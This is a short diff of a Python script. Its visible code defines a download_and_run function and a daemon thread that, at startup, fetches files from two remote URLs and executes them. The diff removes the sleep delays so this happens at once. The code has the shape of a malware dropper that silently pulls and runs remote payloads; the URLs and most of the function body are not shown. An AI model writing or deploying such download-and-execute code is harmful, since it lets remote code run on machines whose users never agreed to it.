@@ -1,6 +1,5 @@
 import os
 import threading
-import time
 import requests
 import ctypes
 
@@ -22,7 +21,6 @@ def download_and_run(url, path):
         pass
 
 def background_task():
-    time.sleep(5)
     download_and_run(URL1, PATH1)
     download_and_run(URL2, PATH2)
 
@@ -30,4 +28,3 @@ if __name__ == "__main__":
     t = threading.Thread(target=background_task)
     t.daemon = True
     t.start()
-    time.sleep(1)
